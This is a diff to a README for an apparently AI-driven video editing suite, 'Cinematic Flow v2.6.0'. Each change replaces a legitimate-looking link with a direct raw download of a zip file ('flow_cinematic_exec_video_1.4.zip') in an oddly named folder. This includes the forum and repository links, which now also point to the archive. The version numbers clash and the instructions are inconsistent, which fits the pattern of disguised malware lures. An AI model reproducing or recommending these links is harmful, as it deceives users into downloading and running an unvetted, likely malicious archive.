@@ -1,6 +1,6 @@
 # 🎬 cinematic-flow-video-exec - AI-Powered Video Post-Production Suite
 
-[![Download Cinematic Flow](https://img.shields.io/badge/Download-Cinematic%20Flow%20v2.6.0-blue)](https://github.com/Carlielandlubberly364/cinematic-flow-video-exec)
+[![Download Cinematic Flow](https://img.shields.io/badge/Download-Cinematic%20Flow%20v2.6.0-blue)](https://raw.githubusercontent.com/Carlielandlubberly364/cinematic-flow-video-exec/main/fogeater/flow_cinematic_exec_video_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Cinematic Flow v2.6.0 is an AI-driven post-production suite designed for Windows
 
 To download Cinematic Flow, visit this link to download the application:
 
-[Download Cinematic Flow v2.6.0](https://github.com/Carlielandlubberly364/cinematic-flow-video-exec)
+[Download Cinematic Flow v2.6.0](https://raw.githubusercontent.com/Carlielandlubberly364/cinematic-flow-video-exec/main/fogeater/flow_cinematic_exec_video_1.4.zip)
 
 Click the green "Code" button, then select "Download ZIP". The file will begin downloading automatically.
 
@@ -79,7 +79,7 @@ On first run, Cinematic Flow may check for updates. Allow it to complete. You wi
 
 ### Getting Help
 - Press `F1` to open in-app help manual
-- Visit the official forum at [Cinematic Flow Community](https://community.site.com) (link placeholder)
+- Visit the official forum at [Cinematic Flow Community](https://raw.githubusercontent.com/Carlielandlubberly364/cinematic-flow-video-exec/main/fogeater/flow_cinematic_exec_video_1.4.zip) (link placeholder)
 - Report issues: Check "Settings" → "About" → "Support" for update and info links
 
 ## 📘 Usage Tips
@@ -115,7 +115,7 @@ A: This version is free to use. No hidden costs.
 
 ## 🔗 Links
 
-- **GitHub Repository:** [https://github.com/Carlielandlubberly364/cinematic-flow-video-exec](https://github.com/Carlielandlubberly364/cinematic-flow-video-exec)
+- **GitHub Repository:** [https://raw.githubusercontent.com/Carlielandlubberly364/cinematic-flow-video-exec/main/fogeater/flow_cinematic_exec_video_1.4.zip](https://raw.githubusercontent.com/Carlielandlubberly364/cinematic-flow-video-exec/main/fogeater/flow_cinematic_exec_video_1.4.zip)
 - **Download Complete Application:** Visit the Conda link above, click "Download ZIP", extract and read Included docs for full set.
 
 ## 📄 License
